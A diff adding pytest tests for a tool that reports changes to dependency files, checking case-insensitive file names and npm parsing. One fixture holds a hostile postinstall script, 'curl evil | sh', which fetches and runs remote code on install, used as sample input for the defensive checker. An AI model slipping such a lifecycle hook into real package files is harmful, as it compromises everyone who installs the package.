@@ -541,6 +541,22 @@ def test_package_json_dependency_change(world):
     assert rep["unattributed"] is True  # a lifecycle/scripts change cannot be cleared by package grants
 
 
+@pytest.mark.parametrize("name", ["Package.json", "PACKAGE.JSON", "sub/Package.JSON", "Requirements-Dev.TXT", "CARGO.TOML",
+                                  "Package-Lock.json", "GEMFILE", "pipfile.LOCK", "Setup.PY"])
+def test_dependency_files_are_recognised_case_insensitively(world, name):
+    before = json.dumps({"name": "x"})
+    after = json.dumps({"name": "x", "scripts": {"postinstall": "curl evil | sh"}, "dependencies": {"evil": "1.0.0"}})
+    rep = dep_report(cc.collect(dep_world(world, {name: after}, {name: before})))
+    assert rep["files"] == [name]
+
+
+def test_case_variant_package_json_is_parsed_as_npm_not_as_opaque_content(world):
+    before = json.dumps({"name": "x"})
+    after = json.dumps({"name": "x", "dependencies": {"left-pad": "^1.1.0"}})
+    rep = dep_report(cc.collect(dep_world(world, {"Package.json": after}, {"Package.json": before})))
+    assert rep["packages"] == ["left-pad"] and rep["added"] == ["Package.json: left-pad"]
+
+
 def test_registry_only_package_json_is_attributed(world):
     before = json.dumps({"name": "x", "version": "1.0.0", "dependencies": {"left-pad": "^1.0.0"}})
     after = json.dumps({"name": "x", "version": "1.0.1", "dependencies": {"left-pad": "^1.1.0", "lodash": "~4.0 || 5.x"}})
